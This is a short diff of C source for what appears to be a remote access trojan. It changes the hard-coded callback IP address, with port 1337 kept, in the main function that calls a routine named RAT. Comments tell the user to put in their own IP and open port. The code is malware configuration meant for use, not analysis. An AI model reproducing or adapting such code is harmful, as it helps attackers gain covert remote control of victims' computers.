@@ -292,7 +292,7 @@ int main(int argc, char **argv) {
         RAT(argv[1], port);
     }
     else {
-        char host[] = "192.168.17.10";     // change this to your ip address
+        char host[] = "192.168.75.100";     // change this to your ip address
         int port = 1337;                    // change this to your open port
         RAT(host, port);
     }
